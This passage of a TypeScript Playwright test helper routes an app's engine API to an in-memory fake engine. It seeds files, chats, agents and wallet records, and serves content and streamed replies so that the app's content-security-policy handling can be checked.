            scan: { status: 'clean' as const, checkedAt: '2026-09-30T10:00:00.000Z' },
            createdBy: 'member-owner',
            createdAt: '2026-09-30T10:00:00.000Z',
            ...fields,
        },
        content: new Blob([PNG_1X1], { type: contentType }),
    };
}

function fakeFiles() {
    return [
        fakeFile(FAKE_FILE_ID, 'photo.png', 'image/png', { createdAt: '2026-09-30T10:05:00.000Z' }),
        fakeFile('file-hostile', HOSTILE_FILE_NAME, 'image/png', { createdAt: '2026-09-30T10:04:00.000Z' }),
        fakeFile('file-svg', 'diagram.svg', 'image/svg+xml', { createdAt: '2026-09-30T10:03:00.000Z' }),
        fakeFile('file-infected', 'invoice.png', 'image/png', {
            purpose: 'attachment',
            scan: { status: 'infected', checkedAt: '2026-09-30T10:02:00.000Z' },
            createdAt: '2026-09-30T10:02:00.000Z',
        }),
        fakeFile('file-notes', 'notes.md', 'text/markdown', {
            purpose: 'knowledge',
            createdAt: '2026-09-30T10:01:00.000Z',
        }),
    ];
}

/** Content as an engine serves it: the declared type, nosniff and always an attachment; infected is a 409. */
async function serveContent(engineApi: EngineApiClient, route: Route, match: RegExpExecArray, query: URLSearchParams) {
    const signal = AbortSignal.timeout(5_000);
    const id = fileId(match);
    const version = query.get('version');
    const content = await engineApi.files.download(id, version === null ? {} : { version: version as never }, signal);
    const metadata = await engineApi.files.get(id, signal);
    if (content.kind === 'problem' || metadata.kind === 'problem') {
        await fulfil(
            route,
            content.kind === 'problem' ? content : { kind: 'problem', problem: createProblem('not-found') },
            404,
        );
        return;
    }
    await route.fulfill({
        status: 200,
        contentType: metadata.data.contentType,
        headers: { 'x-content-type-options': 'nosniff', 'content-disposition': 'attachment' },
        body: Buffer.from(await content.data.arrayBuffer()),
    });
}

/** The whole reply as one SSE body: the in-memory reply generates as it is read, so reading it ends it. */
function encodeStream<Event extends { readonly type: string }>(items: readonly EngineApiStreamItem<Event>[]): string {
    return items
        .map((item) =>
            encodeSseMessage({
                event: item.event.type,
                ...(item.id === null ? {} : { id: item.id }),
                data: JSON.stringify(item.event),
            }),
        )
        .join('');
}

async function collect<Event>(items: AsyncIterable<EngineApiStreamItem<Event>>): Promise<EngineApiStreamItem<Event>[]> {
    const collected: EngineApiStreamItem<Event>[] = [];
    for await (const item of items) collected.push(item);
    return collected;
}

async function replyStream(engineApi: EngineApiClient, match: RegExpExecArray, signal: AbortSignal): Promise<string> {
    const response = await engineApi.chats.streamReply(chatId(match), messageId(match), {}, signal);
    if (response.kind === 'problem') return '';
    return encodeStream(await collect(response.data as AsyncIterable<EngineApiStreamItem<ReplyStreamEvent>>));
}

/** The test chat's whole reply in one response: the page still reads it as a stream of deltas. */
async function serveTestChat(
    engineApi: EngineApiClient,
    route: Route,
    agentId: string,
    body: TestChatBody,
    signal: AbortSignal,
): Promise<void> {
    const response = await engineApi.testChat.stream(AgentId.parse(agentId), body, signal);
    if (response.kind === 'problem') {
        await fulfil(route, response, response.problem.status);
        return;
    }
    const items = await collect(response.data as AsyncIterable<EngineApiStreamItem<TestChatEvent>>);
    await route.fulfill({ status: 200, contentType: 'text/event-stream', body: encodeStream(items) });
}

/**
 * Answers the engine API from the in-memory client until the mock engine (M-04) and the loader (M-05) serve the
 * bundle for real (X-04). Same origin as the bundle, so `connect-src 'self'` still applies. `member` signs in as
 * someone other than the owner, `capabilities` replaces what the engine advertises; routed again on the same page, the
 * newer routing wins.
 */
export async function routeFakeEngineApi(
    page: Page,
    options: {
        readonly member?: InMemoryMember;
        readonly onboarding?: 'pending';
        readonly capabilities?: readonly CapabilityRef[];
        /** Advertises `browser-tab@1` and serves its channel over a routed WebSocket. */
        readonly liveBrowser?: boolean;
    } = {},
): Promise<InMemoryEngineController> {
    const engine = createInMemoryEngine({
        // File scanning is optional (#189); these checks cover its badges and the blocked download.
        capabilities: [
            ...(options.capabilities ?? [...DEFAULT_CAPABILITIES, KNOWN_CAPABILITIES.fileScanning]),
            ...(options.liveBrowser === true ? [KNOWN_CAPABILITIES.browserTab] : []),
        ],
        ...(options.member === undefined ? {} : { member: options.member }),
        seed: {
            activity: [...FAKE_ACTIVITY],
            engine: { name: 'CSP test engine', hostname: 'engine.localhost', dashboardUrl: null, mode: 'local' },
            ...(options.onboarding === undefined ? {} : { onboarding: options.onboarding }),
            security: SECURITY_OVERVIEW,
            integrationSecrets: [
                { id: 'secret-github', name: 'GITHUB_TOKEN', scope: { kind: 'engine' }, status: 'active' },
                {
                    id: 'secret-ada',
                    name: 'ADA_SEARCH_KEY',
                    scope: { kind: 'agent', agentId: FAKE_AGENT_ID },
                    status: 'revoked',
                },
            ],
            wallet: {
                records: [
                    {
                        id: 'login-github',
                        label: 'github.com · ad…@example.com',
                        origin: 'https://github.com',
                        username: 'ada@example.com',
                        fields: [],
                        updatedAt: '2026-09-01T00:00:00.000Z',
                        lastUse: { at: '2026-09-30T10:00:00.000Z', outcome: 'signed-in' },
                        verification: null,
                    },
                ],
                pending: [
                    {
                        id: 'walletreq-linear',
                        origin: 'https://linear.app',
                        account: null,
                        problem: 'missing',
                        fields: [],
                        recordId: null,
                        reason: HOSTILE_TARGET_NAME,
                        tasks: [HOSTILE_TARGET_NAME],
                        agents: ['Ada'],
                        requests: 1,
                        createdAt: '2026-09-30T09:00:00.000Z',
                        seenAt: null,
                        step: 0,
                    },
                ],
            },
            auditEntries: auditEntries(),
            runs: fakeRuns(),
            tasks: fakeTasks(),
            triggers: fakeTriggers(),
            files: fakeFiles(),
            integrations: fakeIntegrations(),
            members: [
                {
                    id: 'member-jana',
                    displayName: 'Jana Nováková',
                    role: 'admin',
                    status: 'active',
                    createdAt: '2026-09-01T00:00:00.000Z',
                    lastSeenAt: null,
                },
            ],
            agents: [
                { id: FAKE_AGENT_ID, source: 'Ada\nPERSONA Research', runState: 'running', visibility: 'public' },
                { id: 'grace', source: 'Grace\nPERSONA Review', createdBy: 'member-jana' },
            ],
            chats: [
                {
                    id: FAKE_CHAT_ID,
                    title: 'Injection demo',
                    createdAt: '2026-09-30T10:00:00.000Z',
                    entries: [
                        { type: 'joined', participant: USER },
                        { type: 'joined', participant: ADA },
                        userSays('Show me everything you can render.', '2026-09-30T10:00:00.000Z'),
                        { type: 'message', author: ADA, content: HOSTILE_REPLY, at: '2026-09-30T10:01:00.000Z' },
                    ],
                },
                {
                    id: 'chat-question',
                    title: 'Shipping',
                    createdAt: '2026-09-29T10:00:00.000Z',
                    entries: [
                        { type: 'message', author: ADA, content: '+@User Do we ship to Brno?', choices: ['Yes', 'No'] },
                    ],
                },
                {
                    id: FAKE_LONG_CHAT_ID,
                    title: 'Quarterly review',
                    createdAt: '2026-09-20T10:00:00.000Z',
                    entries: [
                        { type: 'joined', participant: USER },
                        { type: 'joined', participant: ADA },
                        { type: 'joined', participant: GRACE },
                        ...longThread(),
                    ],
                },
            ],
        },
        uploadPolicies: { knowledge: { maxBytes: 10 * 1024 * 1024, accept: ['.md', '.pdf', 'text/plain'] } },
        // Sent messages get the same hostile reply, streamed in pieces.
        replyScript: () => ({ chunks: HOSTILE_REPLY.match(/[\s\S]{1,40}/g) ?? [] }),
    });
    const engineApi = engine.client;
    await saveSecondBookVersion(engineApi);
    if (options.liveBrowser === true) await routeLiveChannels(page, engine);
    await page.route(`**${ENGINE_API_PREFIX}/**`, async (route) => {
        const request = route.request();
        const url = new URL(request.url());
        const path = url.pathname.slice(ENGINE_API_PREFIX.length);
        const signal = AbortSignal.timeout(5_000);
        if (path === '/events') {
            // A stream that ends at once: the app reconnects with backoff, and the page still goes network-idle.
            await route.fulfill({ status: 200, contentType: 'text/event-stream', body: '' });
            return;
        }
        const content = CONTENT.exec(path);
        if (request.method() === 'GET' && content !== null) {
            await serveContent(engineApi, route, content, url.searchParams);
            return;
        }
        const stream = STREAM.exec(path);
        if (request.method() === 'GET' && stream !== null) {
            await route.fulfill({
                status: 200,
                contentType: 'text/event-stream',
                body: await replyStream(engineApi, stream, signal),
            });
            return;
        }
        const testChat = TEST_CHAT.exec(path);
        if (request.method() === 'POST' && testChat !== null) {
            await serveTestChat(engineApi, route, testChat[1] ?? '', request.postDataJSON() as TestChatBody, signal);
            return;
        }
        for (const [method, pattern, status, call] of ROUTES) {
            const match = pattern.exec(path);
            if (request.method() === method && match !== null) {
                const body: unknown = method === 'GET' ? undefined : (request.postDataJSON() as unknown);
                await fulfil(route, await call(engineApi, match, url.searchParams, body ?? {}, signal), status);
                return;
            }
        }
        await fulfil(route, { kind: 'problem', problem: createProblem('not-found') }, 404);
    });
    return engine.controller;
}

/** Frames reach the page at most this often, so the screencast does not spin the CPU for the length of a check. */
const FRAME_INTERVAL_MS = 100;

/**
 * The live channel as the engine's gateway binds it: Playwright answers the page's WebSocket at `LIVE_CHANNEL_PATH`
 * from the in-memory engine, so the bundle draws real PNG frames under the engine CSP.
 */
async function routeLiveChannels(page: Page, engine: InMemoryLiveEngine): Promise<void> {
    const path = new RegExp(`${ENGINE_API_PREFIX}${LIVE_CHANNEL_PATH.replace('{sessionId}', '([\\w-]+)')}$`);
    await page.routeWebSocket(path, (socket: WebSocketRoute) => {
        const sessionId = path.exec(new URL(socket.url()).pathname)?.[1] ?? '';
        let lastFrame = 0;
        const attached = engine.attachLiveChannel(sessionId, {
            send: (data) => {
                if (typeof data === 'string') {
                    socket.send(data);
                    return;
                }
                const wait = Math.max(0, lastFrame + FRAME_INTERVAL_MS - Date.now());
                lastFrame = Date.now() + wait;
                setTimeout(() => {
                    // The page may have closed the socket meanwhile; a frame for nobody is dropped.
                    try {
                        socket.send(Buffer.from(data));
                    } catch {
                        return;
                    }
                }, wait);
            },
            close: (code) => {
                void socket.close({ code });
            },
        });
        if (attached.kind === 'refused') {
            void socket.close({ code: 1008 });
            return;
        }
        attached.peer.opened();
        socket.onMessage((message) => {
            attached.peer.receive(typeof message === 'string' ? message : new Uint8Array(message));
        });
        socket.onClose(() => {
            attached.peer.closed();
        });
    });
}

/** The agent whose book the editor checks open; a second version gives its history something to compare. */
export const BOOK_AGENT_ID = 'grace';

async function saveSecondBookVersion(engineApi: EngineApiClient): Promise<void> {
    const signal = AbortSignal.timeout(5_000);
    const id = AgentId.parse(BOOK_AGENT_ID);
    const current = await engineApi.agents.getSource(id, signal);
    if (current.kind === 'problem') throw new Error('The book agent is missing from the seed');
    const source = `${current.data.source}\nRULE Be kind\nKNOWLEDGE https://example.com/guide.pdf`;
    await engineApi.agents.updateSource(id, { source, baseRevisionId: current.data.revisionId }, signal);
}

const USER = { kind: 'user', key: 'user' } as const;
const ADA = { kind: 'agent', key: FAKE_AGENT_ID } as const;
const GRACE = { kind: 'agent', key: 'grace' } as const;

function longThread() {
    return Array.from({ length: 12 }, (_, turn) => {
        const at = (minute: number) => `2026-09-20T10:${String(turn * 4 + minute).padStart(2, '0')}:00.000Z`;
        return [
            userSays(`Point ${String(turn + 1)}: what changed since last quarter?`, at(0)),
            {
                type: 'progress' as const,
                author: ADA,
                steps: [{ kind: 'tool' as const, tool: 'Read', text: 'reports/quarterly.md' }],
            },
            {
                type: 'message' as const,
                author: ADA,
                content: 'Revenue grew in every region.\n\n'.repeat(3),
                at: at(1),
            },
            { type: 'message' as const, author: ADA, content: 'Costs held flat.', at: at(1) },
            { type: 'message' as const, author: GRACE, content: '@Ada The numbers check out.', at: at(2) },
        ];
    }).flat();
}

function userSays(content: string, at: string) {
    return { type: 'message' as const, author: USER, createdBy: 'member-owner', content, at };
}

async function fulfil(route: Route, response: EngineApiResponse<unknown>, status: number): Promise<void> {
    if (response.kind === 'ok') {
        await route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(response.data) });
    } else {
        await route.fulfill({
            status: response.problem.status,
            contentType: 'application/problem+json',
            body: JSON.stringify(response.problem),
        });
    }
}
